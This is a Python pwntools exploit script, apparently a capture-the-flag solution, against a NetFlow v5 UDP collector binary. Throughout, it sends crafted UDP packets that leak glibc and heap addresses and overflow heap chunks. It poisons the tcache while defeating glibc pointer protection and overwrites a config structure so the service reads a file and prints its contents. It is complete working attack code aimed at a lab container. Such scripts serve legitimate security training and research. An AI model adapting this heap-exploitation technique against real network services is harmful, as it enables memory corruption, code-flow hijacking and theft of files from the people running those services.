#!/usr/bin/python
from pwn import *
import socket

context.log_level = "info"
context.terminal = ['urxvt', '-e', 'sh', '-c']

CURR_DIR = os.path.dirname(os.path.realpath(__file__))
PATH = CURR_DIR + "/"
BINARY = PATH + "./netflaw_patched"

exe = ELF(PATH + "./netflaw_patched")
libc = ELF(PATH + "./libc-2.28.so")
ld = ELF(PATH + "./ld-2.28.so")

HOST = "172.17.0.2"
PORT = 9000
UDP_PORT = 8080

context.binary = exe.path

# elf = ELF(BINARY, checksec=False)
uu64 = lambda x: u64(x.ljust(8, b"\x00"))
uu32 = lambda x: u32(x.ljust(4, "\x00"))
uu16 = lambda x: u16(x.ljust(4, "\x00"))

# rockylinux:8
HEAP_BASE_OFFSET = 0x11f0
GLIBC_BASE_OFFSET = 0x3d1230
CONFIG_CHUNK_OFFSET = 0x6b0
# local FIRST_0x40_CHUNK_OFFSET = 0xd30
FIRST_0x40_CHUNK_OFFSET = 0x100
# local SECOND_0x40_CHUNK_OFFSET = 0xcf0
SECOND_0x40_CHUNK_OFFSET = 0x140

gdbscript = '''
# b *print_netflow_v5_record+0
# b *parse_netflow_v5_records+99
# call   0x400f89 <get_netflow_v5_from_data>
# b *main+156
# after all frees
# b *main+321
# call   0x400bc0 <printf@plt>
# b *main+281
# b *read_file_to_buffer+32
continue
'''

def attach(r):
    if type(r) == process:
        gdb.attach(r, gdbscript)

def send_udp_packet(ip, port, data):
    sock = remote(ip, port, typ='udp')
    sock.send(data)
    sock.close()

def build_netflow_header(netflow_version, header_flow_count):
    netflow_v5_header = p16(number=netflow_version, endianness="big", sign="unsigned") + \
                        p16(number=header_flow_count, endianness="big", sign="unsigned") + \
                        p32(1) + \
                        p32(71) + \
                        p32(71) + \
                        p32(2) + \
                        b'\x00' + \
                        b'\x00' + \
                        b'\x00\x00'
    return netflow_v5_header

def build_netflow_packet(header_flow_count, actual_flow_count, flow_byte):
    netflow_v5_header = build_netflow_header(5, header_flow_count)
    netflow_v5_flows = flow_byte*48*actual_flow_count
    return netflow_v5_header + netflow_v5_flows

def build_netflow_packet_overwrite(flow_count, overwrite_bytes):
    netflow_v5_header = build_netflow_header(5, flow_count)
    netflow_v5_flows = (b'\x41'*(48*flow_count)) + overwrite_bytes
    return netflow_v5_header + netflow_v5_flows

def build_netflow_packet_overwrite_raw(netflow_version, flow_count, overwrite_bytes):
    netflow_v5_header = build_netflow_header(netflow_version, flow_count)
    netflow_v5_flows = overwrite_bytes
    return netflow_v5_header + netflow_v5_flows

def print_bytes(data):
    print("[i] printing bytes:")
    for i in range(0, len(data), 8):
        print(" ".join("{:02x}".format(c) for c in data[i:i + 8]))

def parse_netflow_record_output_to_bytes():
    # Parse output to bytes
    output = b''
    r.recvuntil(b'NetFlow v5 Record:\n')
    r.recvuntil(b'Source IP: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += socket.inet_aton(data)
    r.recvuntil(b'Destination IP: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += socket.inet_aton(data)
    r.recvuntil(b'Next Hop: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += socket.inet_aton(data)
    r.recvuntil(b'Input Interface: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p16(int(data))
    r.recvuntil(b'Output Interface: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p16(int(data))
    r.recvuntil(b'Packets: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p32(int(data))
    r.recvuntil(b'Bytes: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p32(int(data))
    r.recvuntil(b'First: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p32(int(data))
    r.recvuntil(b'Last: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p32(int(data))
    r.recvuntil(b'Source Port: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p16(int(data))
    r.recvuntil(b'Destination Port: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p16(int(data))
    r.recvuntil(b'TCP Flags: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p8(int(data))
    r.recvuntil(b'Protocol: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p8(int(data))
    r.recvuntil(b'Type of Service: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p8(int(data))
    output += b'\x00'  # Pad to 32 bytes
    r.recvuntil(b'Source AS: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p16(int(data))
    r.recvuntil(b'Destination AS: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p16(int(data))
    r.recvuntil(b'Source Mask: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p8(int(data))
    r.recvuntil(b'Destination Mask: ')
    data = r.recvuntil(b'\n').strip().decode('ascii')
    output += p8(int(data))
    output += b'\x00\x00'  # Pad to 48 bytes
    return output

def leak_addresses():
    r.recvuntil(b'...\n')
    send_udp_packet(HOST,
                    UDP_PORT,
                    build_netflow_packet(1, 1, b'\xaa')
                    )
    r.recvuntil(b'Destination Mask:')
    r.recvline()
    send_udp_packet(HOST,
                    UDP_PORT,
                    build_netflow_packet(2, 0, b'')
                    )
    output = parse_netflow_record_output_to_bytes()
    print_bytes(output)
    glibc_leaked_addr = uu64(output[0:8])
    heap_leaked_addr = uu64(output[16:24])
    glibc_base_addr = glibc_leaked_addr - GLIBC_BASE_OFFSET
    heap_base_addr = heap_leaked_addr - HEAP_BASE_OFFSET
    success("leaked glibc addr        : " + hex(glibc_leaked_addr))
    success("netflow struct heap addr : " + hex(heap_leaked_addr))
    return (heap_base_addr, glibc_base_addr)


def protect_ptr(pos: int, pointer: int) -> int:
    """https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L339"""
    return (pos >> 12) ^ pointer


def reveal_ptr(pointer: int) -> int:
    """https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L341"""
    return pointer ^ (pointer >> 12)


def poison_tcache(addr):
    ptr1 = p64(protect_ptr(addr+FIRST_0x40_CHUNK_OFFSET, 0))
    success("poison first chunk with ptr1: " + hex(uu64(ptr1)))
    print_bytes(ptr1)
    config_chunk_addr = addr + CONFIG_CHUNK_OFFSET
    second_chunk_addr = addr + SECOND_0x40_CHUNK_OFFSET
    success("config chunk @ " + hex(config_chunk_addr))
    success("second chunk @ " + hex(second_chunk_addr))
    protected_config_chunk = protect_ptr(second_chunk_addr, config_chunk_addr)
    success("protected config chunk: " + hex(protected_config_chunk))
    ptr2 = p64(number=protected_config_chunk+1, sign="unsigned")
    success("poison second chunk with ptr2: " + hex(uu64(ptr2)))
    print_bytes(ptr2)
    send_udp_packet(HOST,
                    UDP_PORT,
                    build_netflow_packet_overwrite(1,
                                                   b'\x42'*8 +
                                                   b'\x00\x00\x00\x41'+b'\x00'*4 +
                                                   ptr1[3:4] + ptr1[2:3] + ptr1[1:2] + ptr1[0:1] + ptr1[7:8] + ptr1[6:7] + ptr1[5:6] + ptr1[4:5] +
                                                   b'\xcc'*40 +
                                                   b'\x43' * 8 +
                                                   b'\x00\x00\x00\x41' + b'\x00' * 4 +
                                                   ptr2[1:2] + ptr2[0:1] + ptr2[3:4] + ptr2[2:3] + ptr2[7:8] + ptr2[6:7] + ptr2[5:6] + ptr2[4:5] +
                                                   b'\xdd' * 32
                                                   )
                    )


def overwrite_config_file(addr):
    version = protect_ptr(addr+CONFIG_CHUNK_OFFSET, 0)
    success("using version " + str(int.from_bytes(p64(version)[0:2])))

    # buffer = b'\x47'*18 + b'/tmp/flag\0' + b'\x47'*(48-18-len(b'/tmp/flag\0'))
    # buffer = (b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12' +
    #           b'\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x30' +
    #           b'\x31\x32\x33\x34\x35\x36\x37\x38\x39\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x50\x51\x52\x53\x54')
# 0x3b6f6c2:	0x12	0x11	0x18	0x17	0x16	0x15	0x1c	0x1b
# 0x3b6f6ca:	0x1a	0x19	0x20	0x1f	0x1e	0x1d	0x22	0x21
# $ echo -en 'flag\x00' | xxd
# 00000000: 666c 6167 00                             flag.

    buffer = (b'\xff'*0x10 +
              b'\x6c' + b'\x66' +
              b'\x13' + b'\x14' +
              b'\x15' + b'\x00' +
              b'\x67' + b'\x61' +
              b'\xff'*0x30)

    send_udp_packet(HOST,
                    UDP_PORT,
                    build_netflow_packet_overwrite_raw(int.from_bytes(p64(version)[0:2], "little"),11, buffer)
                    )
    r.recvuntil(b'Destination Mask: ')

def trigger_read_of_flag():
    send_udp_packet(HOST,
                    UDP_PORT,
                    # build_netflow_packet_overwrite(1, b'\x42'*20 + b'\x00\x00\x00\x41'+b'\x00'*4 + p64(addr) + b'\xcc'*24)
                    build_netflow_packet_overwrite_raw(int.from_bytes(b'\xff\xff', "little"), 11, b''
                                                       )
                    )
    r.recvuntil(b'Destination Mask: ')

def dump_flag_from_config_chunk(addr):
    version = protect_ptr(addr+CONFIG_CHUNK_OFFSET, 0)
    success("using version " + str(int.from_bytes(p64(version)[0:2])))
    send_udp_packet(HOST,
                    UDP_PORT,
                    # build_netflow_packet_overwrite(1, b'\x42'*20 + b'\x00\x00\x00\x41'+b'\x00'*4 + p64(addr) + b'\xcc'*24)
                    build_netflow_packet_overwrite_raw(int.from_bytes(p64(version)[0:2], "little"), 11, b''
                                                       )
                    )
    data = b''
    data += parse_netflow_record_output_to_bytes()
    data += parse_netflow_record_output_to_bytes()
    # data = parse_netflow_record_output_to_bytes(data)
    print_bytes(data)
    return data[48:].decode('ascii')


def test_parser():
    buffer = (b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12' +
              b'\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x30' +
              b'\x31\x32\x33\x34\x35\x36\x37\x38\x39\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x50\x51\x52\x53\x54' +
              b'\x55\x56\x57\x58\x59\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79' +
              b'\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x00\x01\x02\x03\x04')
    send_udp_packet(HOST,
                    UDP_PORT,
                    # build_netflow_packet_overwrite(1, b'\x42'*20 + b'\x00\x00\x00\x41'+b'\x00'*4 + p64(addr) + b'\xcc'*24)
                    build_netflow_packet_overwrite_raw(5, 2, buffer
                                                       )
                    )
    data = parse_netflow_record_output_to_bytes()
    data += parse_netflow_record_output_to_bytes()
    print_bytes(data)


def exploit():
    (heap_base_addr, glibc_base_addr) = leak_addresses()
    success("glibc base addr : " + hex(glibc_base_addr))
    success("heap base addr  : " + hex(heap_base_addr))
    info("poisoning tcache")
    poison_tcache(heap_base_addr)
    info("overwriting config file")
    overwrite_config_file(heap_base_addr)
    info("triggering read of flag")
    trigger_read_of_flag()
    info("dumping flag")
    flag = dump_flag_from_config_chunk(heap_base_addr)
    success("flag: " + flag)


if __name__ == '__main__':
    os.chdir(PATH)
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], PORT)
    else:
        print(sys.argv)
        HOST = "127.0.0.1"
        HEAP_BASE_OFFSET = 0xe40
        GLIBC_BASE_OFFSET = 0x1e9100
        CONFIG_CHUNK_OFFSET = 0x6b0
        FIRST_0x40_CHUNK_OFFSET = 0xd30
        SECOND_0x40_CHUNK_OFFSET = 0xcf0
        bin = ELF(BINARY)
        r = process([bin.path])
        attach(r)

    exploit()



